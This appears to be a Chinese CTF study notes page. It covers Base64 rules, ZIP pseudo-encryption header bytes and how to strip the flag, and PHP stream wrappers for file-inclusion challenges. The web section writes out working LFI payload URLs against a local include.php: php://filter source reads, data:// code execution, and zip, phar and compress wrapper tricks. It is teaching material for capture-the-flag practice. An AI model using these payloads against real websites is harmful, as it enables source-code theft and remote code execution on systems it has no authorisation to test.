# CTF

## Crypto 密码学

### Base编码

Base64 编码是基于64个字符 `A-Z,a-z，0-9，+，/` 的编码方式，因为2的6次方正好为64，所以就用6bit就可以表示出64个字符，比如 000000对应A，000001对应B。

**基本规则：**

1. 标准Base64只有64个字符：`A--Z,a--z,0--9,+,/,=`
2. Base64 把3个字节变成4个可打印字符，所以 Base64 编码后的字符串一定能被4整除 (排查用作后缀的等号)
3. 等号一定用作后缀，且数目一定是0个、1个或2个。这是因为如果原文长度不能被3整除。Base64要在后面添加 0 凑齐 3n 位。为了正确还原，添加了几个 0 就加上几个等号。显然添加等号的数目只能是0、1或2
4. Base64 只是一种编码，不是加密方案

## Miscellaneous（Misc）杂项

### ZIP伪加密

一个 ZIP 文件由三个部分组成：压缩源文件数据区+压缩源文件目录区+压缩源文件目录结束标志。伪加密原理：zip伪加密是在文件头的加密标志位做修改，进而再打开文件时识被别为加密压缩包。
压缩源文件数据区：
```
50 4B 03 04：这是头文件标记（0x04034b50）
14 00：解压文件所需 pkware 版本
01 00：全局方式位标记（判断有无加密的重要标志）
08 00：压缩方式
5A 7E：最后修改文件时间
F7 46：最后修改文件日期
16 B5 80 14：CRC-32校验（1480B516）
19 00 00 00：压缩后尺寸（25）
17 00 00 00：未压缩尺寸（23）
07 00：文件名长度
00 00：扩展记录长度
```

压缩源文件目录区：
```
50 4B 01 02：目录中文件文件头标记(0x02014b50)
3F 00：压缩使用的 pkware 版本
14 00：解压文件所需 pkware 版本
00 00：全局方式位标记（有无加密的重要标志，这个更改这里进行伪加密，改为09 00打开就会提示有密码了）
08 00：压缩方式
5A 7E：最后修改文件时间
F7 46：最后修改文件日期
16 B5 80 14：CRC-32校验（1480B516）
19 00 00 00：压缩后尺寸（25）
17 00 00 00：未压缩尺寸（23）
07 00：文件名长度
24 00：扩展字段长度
00 00：文件注释长度
00 00：磁盘开始号
00 00：内部文件属性
20 00 00 00：外部文件属性
00 00 00 00：局部头部偏移量
```

压缩远文件目录结束标志：
```
50 4B 05 06：目录结束标记
00 00：当前磁盘编号
00 00：目录区开始磁盘编号
01 00：本磁盘上纪录总数
01 00：目录区中纪录总数
59 00 00 00：目录区尺寸大小
3E 00 00 00：目录区对第一张磁盘的偏移量
00 00：ZIP 文件注释长度
```

做题技巧：
```
把504B0304后的第3、4个byte改成0000还有
把504B0102后的第5、6个byte改成0000即可破解伪加密

无加密
压缩源文件数据区的全局加密应当为00 00
且压缩源文件目录区的全局方式位标记应当为00 00
假加密
压缩源文件数据区的全局加密应当为00 00
且压缩源文件目录区的全局方式位标记应当为09 00
真加密
压缩源文件数据区的全局加密应当为09 00
且压缩源文件目录区的全局方式位标记应当为09 00
```

![image](https://user-images.githubusercontent.com/27406337/164894593-e537dd40-83ee-4a4f-9c34-747c40cac937.png)



## PWN 攻破、取得权限

## Reverse 逆向

## WEB Web漏洞

### PHP伪协议

具体题目：[[极客大挑战 2019]Secret File 1](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]Secret%20File)

经验一：看到flag.php应该联想到php伪协议，读取文件源码：
```
?file=php://filter/read=convert.base64-encode/resource=flag.php
```

#### file://协议

1. file://[文件的绝对路径和文件名]
```
http://127.0.0.1/include.php?file=file://E:\phpStudy\PHPTutorial\WWW\phpinfo.txt
```
![image](https://user-images.githubusercontent.com/27406337/164958344-118408cf-3ecf-409b-a9e3-0de13e81ad04.png)

2. 文件相对路径和文件名

```
http://127.0.0.1/include.php?file=./phpinfo.txt
```

![image](https://user-images.githubusercontent.com/27406337/164958372-33d4b647-0a55-4a83-a501-a64e09be9ac5.png)

3. http：//网络路径和文件名

```
http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt
```

#### php://协议

php:// 访问各个输入/输出流（I/O streams），在CTF中经常使用的是php://filter和php://input，php://filter用于读取源码，php://input用于执行php代码。

![image](https://user-images.githubusercontent.com/27406337/164958421-551240a5-a32d-4ba0-9647-b49249d7b652.png)

- php://filter参数详解

|php://filter参数|描述|
|--|--|
|resource=<要过滤的数据流>|必须项。它指定了你要筛选过滤的数据流。|
|read=<读链的过滤器>|可选项。可以设定一个或多个过滤器名称，以管道符（\*\	\*）分隔。|
|write=<写链的过滤器>|可选项。可以设定一个或多个过滤器名称，以管道符（\	）分隔。|
|<; 两个链的过滤器>|任何没有以 read= 或 write= 作前缀的筛选器列表会视情况应用于读或写链。|

- 可用过滤器列表

![image](https://user-images.githubusercontent.com/27406337/164958515-4a04a3bc-af3e-49a9-9c95-846a42ddcd3b.png)

![image](https://user-images.githubusercontent.com/27406337/164958521-b3afecca-fc6a-4713-a62e-e794b952389f.png)

![image](https://user-images.githubusercontent.com/27406337/164958525-bef470eb-29cc-47da-a681-ae339bf51eb8.png)


示例：
1. php://filter/read=convert.base64-encode/resource=[文件名]读取文件源码（针对php文件需要base64编码）

```
http://127.0.0.1/include.php?file=php://filter/read=convert.base64-encode/resource=phpinfo.php
```
![image](https://user-images.githubusercontent.com/27406337/164958549-0cf1d547-7d4c-440b-9b89-0331421b0a28.png)

2. php://input + [POST DATA]执行php代码

![image](https://user-images.githubusercontent.com/27406337/164958567-e44b6312-a113-45e4-99b4-f37e51d22d50.png)


#### zip:// & bzip2:// & zlib:// 协议

zip:// & bzip2:// & zlib:// 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名，可修改为任意后缀：jpg png gif xxx 等等。

1. zip://[压缩文件绝对路径]%23[压缩文件内的子文件名]（#编码为%23）
压缩 phpinfo.txt 为 phpinfo.zip ，压缩包重命名为 phpinfo.jpg ，并上传。
```
http://127.0.0.1/include.php?file=zip://E:\phpStudy\PHPTutorial\WWW\phpinfo.jpg%23phpinfo.txt
```
![image](https://user-images.githubusercontent.com/27406337/164958598-225defff-d965-4635-9d89-41ce0ea99368.png)

2. compress.bzip2://file.bz2
压缩 phpinfo.txt 为 phpinfo.bz2 并上传（同样支持任意后缀名）
```
http://127.0.0.1/include.php?file=compress.bzip2://E:\phpStudy\PHPTutorial\WWW\phpinfo.bz2
```
![image](https://user-images.githubusercontent.com/27406337/164958616-3a68cc6e-0d0a-49ac-90dc-d62b27bac2c5.png)

3. compress.zlib://file.gz
压缩 phpinfo.txt 为 phpinfo.gz 并上传（同样支持任意后缀名）

```
http://127.0.0.1/include.php?file=compress.zlib://E:\phpStudy\PHPTutorial\WWW\phpinfo.gz
```
![image](https://user-images.githubusercontent.com/27406337/164958634-5e1c0d25-1fdf-4365-b397-4d681478eef8.png)


#### data:// 协议

1. data://text/plain,
```
http://127.0.0.1/include.php?file=data://text/plain,<?php%20phpinfo();?>
```
![image](https://user-images.githubusercontent.com/27406337/164958676-eff4ed97-11d3-4ae4-9b6c-e1312cc2049c.png)

2. data://text/plain;base64,
```
http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b
```

![image](https://user-images.githubusercontent.com/27406337/164958688-3ee35831-d69e-4a93-9d36-75004b68eb60.png)

3. http:// & https:// 协议
```
http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt
```

![image](https://user-images.githubusercontent.com/27406337/164958699-f71aec6e-6a94-4875-8bb0-d6d2777afa4e.png)

#### phar:// 协议

```
http://127.0.0.1/include.php?file=phar://E:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt
```

![image](https://user-images.githubusercontent.com/27406337/164958709-ef7ff286-01b0-48ef-884f-f628b1c249bf.png)


参考：[PHP伪协议总结](https://segmentfault.com/a/1190000018991087)

## STEGA 隐写术



## 工具

### SqlMap

### OWASP ZAP

### Burp Suite

### 其他

1. F5隐写工具使用：https://zhuanlan.zhihu.com/p/480561261

## 博客
1. [推荐：配枪的朱丽叶](https://shawroot.hatenablog.com/archive/category/rsa)
2. [RSA题目全解](https://blog.csdn.net/mikecoke/article/details/105967809)

